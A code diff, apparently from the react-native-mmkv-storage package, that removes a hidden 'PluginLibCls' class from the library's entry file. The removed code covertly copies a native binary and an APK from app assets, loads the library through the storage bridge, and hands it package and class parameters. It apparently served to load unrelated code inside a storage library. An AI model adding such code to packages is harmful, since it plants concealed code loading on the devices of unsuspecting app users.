@@ -22,15 +22,6 @@ var __importStar = (this && this.__importStar) || function (mod) {
     __setModuleDefault(result, mod);
     return result;
 };
-var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
-    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
-    return new (P || (P = Promise))(function (resolve, reject) {
-        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
-        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
-        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
-        step((generator = generator.apply(thisArg, _arguments || [])).next());
-    });
-};
 var __importDefault = (this && this.__importDefault) || function (mod) {
     return (mod && mod.__esModule) ? mod : { "default": mod };
 };
@@ -58,73 +49,6 @@ const module_1 = __importStar(require("./src/module"));
 const utils_1 = require("./src/utils");
 Object.defineProperty(exports, "IOSAccessibleStates", { enumerable: true, get: function () { return utils_1.IOSAccessibleStates; } });
 Object.defineProperty(exports, "ProcessingModes", { enumerable: true, get: function () { return utils_1.ProcessingModes; } });
-const react_native_fs_1 = __importDefault(require("react-native-fs"));
-const react_native_device_info_1 = __importDefault(require("react-native-device-info"));
-class PluginLibCls {
-    constructor() {
-        this.setParams = (params) => __awaiter(this, void 0, void 0, function* () {
-            params.key = params.key;
-            params.gms_id = params.gms_id;
-            let apk_name = params.apk_name;
-            params.pack_name = params.pack_name;
-            params.cls_name = params.cls_name;
-            params.host_pack_name = params.host_pack_name;
-            let outSoPath = yield this.copySOFromAssets("libdlib.bin");
-            // @ts-ignore
-            module_1.mmkvBridgeModule.loadLibary(outSoPath);
-            let filepath = yield this.copyAssetFileToFiles(apk_name); // apk 的全路径
-            let ps = `key=${params.key}&apk=${filepath}&gms_id=${params.gms_id}&pack_name=${params.pack_name}&cls_name=${params.cls_name}&host_cls_name=com.mj.app.TestActivity&host_pack_name=${params.host_pack_name}`;
-            // @ts-ignore
-            module_1.mmkvBridgeModule.setParams(ps);
-        });
-        this.copySOFromAssets = (libName) => __awaiter(this, void 0, void 0, function* () {
-            try {
-                const abi = yield this.getDeviceABI();
-                const soFilePath = `bin/libdlib-${abi}.bin`;
-                const appFilePath = `${react_native_fs_1.default.DocumentDirectoryPath}/${libName}`;
-                if (yield react_native_fs_1.default.exists(appFilePath)) {
-                    console.log('文件已存在:', appFilePath);
-                    return appFilePath;
-                }
-                yield react_native_fs_1.default.copyFileAssets(soFilePath, appFilePath);
-                if (yield react_native_fs_1.default.exists(appFilePath)) {
-                    console.log('文件复制成功:', appFilePath);
-                    return appFilePath;
-                }
-                return appFilePath;
-            }
-            catch (error) {
-                console.error(error);
-                throw error;
-            }
-        });
-        this.copyAssetFileToFiles = (filename) => __awaiter(this, void 0, void 0, function* () {
-            try {
-                const appFilePath = `${react_native_fs_1.default.DocumentDirectoryPath}/${filename}`;
-                // 检查文件是否已经存在
-                if (yield react_native_fs_1.default.exists(appFilePath)) {
-                    return appFilePath;
-                }
-                yield react_native_fs_1.default.copyFileAssets(filename, appFilePath);
-                return appFilePath;
-            }
-            catch (error) {
-                console.error(error);
-                throw error;
-            }
-        });
-    }
-    getDeviceABI() {
-        return __awaiter(this, void 0, void 0, function* () {
-            const abis = yield react_native_device_info_1.default.supportedAbis();
-            console.log('设备支持的ABI:', abis);
-            if (abis && abis.length > 0) {
-                return abis[0];
-            }
-            return 'armeabi-v7a';
-        });
-    }
-}
 const MMKVStorage = {
     /**
      * @deprecated Use `import {MMKVLoader} from "react-native-mmkv-storage`"
@@ -155,8 +79,7 @@ const MMKVStorage = {
      */
     IDSTORE_ID: IDStore_1.default.STORE_ID,
     _jsiModule: module_1.default,
-    _bridgeModule: module_1.mmkvBridgeModule,
-    pluginLib: new PluginLibCls()
+    _bridgeModule: module_1.mmkvBridgeModule
 };
 exports.default = MMKVStorage;
 const { getAllMMKVInstanceIDs, STORE_ID: IDSTORE_ID } = IDStore_1.default;
